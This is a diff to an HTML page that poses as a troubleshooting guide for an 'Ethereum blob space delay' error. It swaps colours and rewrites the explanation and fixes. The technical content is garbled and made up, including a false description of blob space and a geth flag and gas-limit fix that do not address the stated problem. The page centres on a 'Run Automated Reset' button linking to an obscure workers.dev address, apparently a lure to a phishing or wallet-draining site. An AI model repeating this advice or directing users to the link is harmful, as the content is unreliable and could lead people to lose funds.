@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: -apple-system;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -45,23 +45,24 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the Ethereum network's limited blob space, which is a storage mechanism for large data such as images and videos. When the blob space is exhausted, new transactions that require this space are delayed or rejected, causing the "blob space delay" error.</li>
+<li>The error occurs due to the Ethereum network's limited capacity to process and store blob data, which is used for various purposes such as storing and verifying large amounts of data associated with smart contracts and transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the <code>--http.cache.size</code> parameter to allocate more memory for caching and reduce the load on the blob space.</li>
-<li>Use a third-party service to offload large data storage and reduce the reliance on Ethereum's blob space.</li>
-<li>Optimize smart contract code to minimize data storage requirements, as shown in the following example:</li>
+<li>Increase the <code>gasLimit</code> to allow for more data to be processed in each block: </li>
+<li>Update the Ethereum node configuration to increase the gas limit</li>
+<li>Use a third-party library to automate the process of increasing the gas limit</li>
+<li>Implement a custom solution using the following code:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--http.cache.size<span class="w"> </span><span class="m">2048</span><span class="w"> </span>--syncmode<span class="w"> </span><span class="s2">&quot;fast&quot;</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--ethash.daglim<span class="w"> </span><span class="m">4096</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
+<p>Consider utilizing an external console for more complex configuration adjustments.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of Ethereum network architecture</li>
-<li>Familiarity with smart contract development and deployment</li>
-<li>Access to the Ethereum node configuration files and command-line interface</li>
+<li>Access to the Ethereum node configuration files</li>
+<li>Basic understanding of Ethereum network architecture</li>
+<li>Familiarity with command-line interfaces and scripting languages</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
